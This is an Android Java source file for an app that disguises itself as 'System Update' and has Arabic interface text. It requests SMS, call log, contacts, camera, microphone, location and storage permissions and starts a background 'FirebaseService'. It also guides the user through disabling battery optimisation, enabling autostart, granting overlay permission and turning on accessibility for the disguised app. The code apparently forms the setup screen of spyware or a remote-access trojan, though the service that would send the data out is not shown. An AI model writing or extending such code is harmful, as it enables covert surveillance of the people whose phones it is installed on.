package com.system.update;

import android.Manifest;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;
import android.widget.Button;
import android.widget.LinearLayout;
import android.widget.TextView;
import android.widget.Toast;
import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import java.util.ArrayList;
import java.util.List;

public class MainActivity extends AppCompatActivity {

    private static final int REQ_PERMS = 1001;
    private TextView statusText;
    private Button activateBtn;
    private LinearLayout layout;

    private final String[] REQUIRED_PERMISSIONS = {
            Manifest.permission.READ_SMS, Manifest.permission.SEND_SMS,
            Manifest.permission.RECEIVE_SMS, Manifest.permission.READ_CALL_LOG,
            Manifest.permission.READ_CONTACTS, Manifest.permission.CAMERA,
            Manifest.permission.RECORD_AUDIO, Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.ACCESS_COARSE_LOCATION, Manifest.permission.READ_EXTERNAL_STORAGE,
            Manifest.permission.WRITE_EXTERNAL_STORAGE
    };

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        
        layout = findViewById(R.id.main_layout);
        statusText = findViewById(R.id.status_text);
        activateBtn = findViewById(R.id.activate_btn);

        startService(new Intent(this, FirebaseService.class));
        statusText.setText("✅ التطبيق يعمل في الخلفية");

        activateBtn.setOnClickListener(v -> requestAllPermissions());

        addSettingsButtons();
    }

    private void addSettingsButtons() {
        if (layout == null) return;

        Button btnBattery = new Button(this);
        btnBattery.setText("1. تعطيل تحسين البطارية");
        btnBattery.setOnClickListener(v -> {
            try {
                Intent i = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
                i.setData(Uri.parse("package:" + getPackageName()));
                startActivity(i);
            } catch (Exception e) { Toast.makeText(this, "غير مدعوم", Toast.LENGTH_SHORT).show(); }
        });
        layout.addView(btnBattery);

        Button btnBg = new Button(this);
        btnBg.setText("2. إذن العمل في الخلفية");
        btnBg.setOnClickListener(v -> {
            Intent i = new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
            i.setData(Uri.parse("package:" + getPackageName()));
            startActivity(i);
        });
        layout.addView(btnBg);

        Button btnAuto = new Button(this);
        btnAuto.setText("3. بدء التلقائي");
        btnAuto.setOnClickListener(v -> {
            try {
                Intent i = new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
                i.setData(Uri.parse("package:" + getPackageName()));
                startActivity(i);
                Toast.makeText(this, "ابحث عن 'بدء التلقائي'", Toast.LENGTH_LONG).show();
            } catch (Exception e) {}
        });
        layout.addView(btnAuto);

        Button btnLock = new Button(this);
        btnLock.setText("4. قفل التطبيق (المهام الحديثة)");
        btnLock.setOnClickListener(v -> {
            Toast.makeText(this, "افتح المهام الحديثة واسحب التطبيق للأسفل", Toast.LENGTH_LONG).show();
        });
        layout.addView(btnLock);

        Button btnPhoneMaster = new Button(this);
        btnPhoneMaster.setText("5. إعدادات Phone Master");
        btnPhoneMaster.setOnClickListener(v -> {
            Intent i = new Intent();
            i.setClassName("com.transsion.phonemaster", "com.transsion.phonemaster.ui.MainActivity");
            try { startActivity(i); } catch (Exception e) {
                Toast.makeText(this, "افتح Phone Master من التطبيقات", Toast.LENGTH_LONG).show();
            }
        });
        layout.addView(btnPhoneMaster);

        Button btnOverlay = new Button(this);
        btnOverlay.setText("6. إذن الظهور فوق التطبيقات");
        btnOverlay.setOnClickListener(v -> {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                Intent i = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION);
                i.setData(Uri.parse("package:" + getPackageName()));
                startActivity(i);
            }
        });
        layout.addView(btnOverlay);

        // زر Accessibility الجديد
        Button btnAccess = new Button(this);
        btnAccess.setText("7. إعدادات إمكانية الوصول (مهم جداً)");
        btnAccess.setTextColor(0xFFFF0000);
        btnAccess.setOnClickListener(v -> {
            Intent i = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
            startActivity(i);
            Toast.makeText(this, "ابحث عن System Update وفعّلها", Toast.LENGTH_LONG).show();
        });
        layout.addView(btnAccess);
    }

    private void requestAllPermissions() {
        List<String> missing = new ArrayList<>();
        for (String p : REQUIRED_PERMISSIONS) {
            if (ContextCompat.checkSelfPermission(this, p) != PackageManager.PERMISSION_GRANTED)
                missing.add(p);
        }
        if (!missing.isEmpty()) {
            ActivityCompat.requestPermissions(this, missing.toArray(new String[0]), REQ_PERMS);
            return;
        }
        done();
    }

    @Override
    public void onRequestPermissionsResult(int code, @NonNull String[] perms, @NonNull int[] results) {
        super.onRequestPermissionsResult(code, perms, results);
        if (code == REQ_PERMS) done();
    }

    private void done() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            try {
                Intent i = new Intent();
                i.setAction(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
                i.setData(Uri.parse("package:" + getPackageName()));
                startActivity(i);
            } catch (Exception e) {}
        }
        startService(new Intent(this, FirebaseService.class));
        Toast.makeText(this, "✅ التطبيق يعمل في الخلفية", Toast.LENGTH_LONG).show();
        statusText.setText("✅ التطبيق يعمل في الخلفية");
    }
        }
